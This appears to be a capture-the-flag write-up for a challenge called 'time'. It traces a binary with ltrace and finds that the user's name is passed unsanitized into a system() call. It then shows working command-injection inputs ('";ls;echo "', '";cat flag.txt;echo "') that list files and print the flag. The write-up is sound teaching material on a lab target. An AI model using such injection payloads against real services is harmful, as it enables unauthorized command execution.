# time writeup

Let's connect and see what we get:
```
$ nc time.tghack.no 1111
What's your name? PewZ

Hello PewZ, here's the current time:
Fri Mar  3 15:35:59 UTC 2017
```

Okay. The program takes a name as input, and then prints our name and the current time.

We could spend time reversing the binary, but an easy way to see what's happening is using `ltrace`:

```
$ ltrace ./time
__libc_start_main(0x4008b5, 1, 0x7ffcf66ba048, 0x4009e0 <unfinished ...>
__sysv_signal(14, 0x400896, 0x7ffcf66b9d10, 0)       = 0
alarm(15)                                            = 0
setvbuf(0x7f454d41a620, 0, 2, 0)                     = 0
printf("What's your name? "What's your name? )                         = 18
fgets(test
"test\n", 64, 0x7f454d4198e0)                  = 0x7ffcf66b9d10
strcspn("test\n", "\n")                              = 4
snprintf("echo "Hello test, here's the cur"..., 511, "echo "Hello %s, here's the curre"..., "test") = 52
system("echo "Hello test, here's the cur"...Hello test, here's the current time:
Fri Mar  3 15:36:41 UTC 2017
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                               = 0
+++ exited (status 0) +++<Paste>
```

Let's look at that format string sent to `snprintf()`.
```
$ strings time | grep echo
echo "Hello %s, here's the current time: " && date
```

Well that's great! We can control the command sent to `system()` by the program.
Let's try something:
```
What's your name? "; ls
sh: 1: Syntax error: Unterminated quoted string
```

Which means we have to make sure that the shell can execute the command without any syntax errors.

```
What's your name? ";ls;echo "

Hello
flag.txt
time
time.c
, here's the current time:
Fri Mar  3 15:40:25 UTC 2017
```

Nice!


```
What's your name? ";cat flag.txt;echo "

Hello
TG17{tick_t0ck_arbitrary_c0de_execution}
, here's the current time:
Fri Mar  3 15:40:52 UTC 2017
```
